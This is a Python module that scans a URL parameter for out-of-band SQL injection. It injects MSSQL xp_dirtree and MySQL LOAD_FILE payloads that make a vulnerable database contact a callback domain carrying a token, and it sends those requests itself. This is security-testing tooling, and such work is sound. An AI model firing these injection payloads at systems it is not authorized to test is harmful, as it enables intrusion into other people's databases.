import uuid
import urllib.parse
import urllib.request

# Out-of-band SQL injection detection
# This module triggers DNS/HTTP requests to a callback domain. The
# user must monitor the callback domain for interactions to confirm
# exploitation.

PAYLOADS = [
    "'; EXEC master..xp_dirtree '//{domain}/{token}';-- ",
    "'; SELECT LOAD_FILE('\\\\{domain}\\{token}');-- ",
]


def test_parameter(url: str, param: str, value: str, callback_domain: str = "example.com"):
    """Attempt OOB SQL injection on a parameter.

    Because verification requires an external listener, this function
    does not automatically confirm vulnerability. Instead it returns a
    token per payload that can be monitored externally.
    """
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    original = query.get(param, [''])[0]

    results = []
    for template in PAYLOADS:
        token = uuid.uuid4().hex
        payload = template.format(domain=callback_domain, token=token)
        query[param] = original + payload
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        # Fire the request but ignore the response. Network issues are tolerated.
        try:
            with urllib.request.urlopen(new_url) as resp:
                resp.read()
        except Exception:
            pass
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'token': token,
            # Vulnerability must be confirmed via callback monitoring
            'vulnerable': False,
        })
    return results

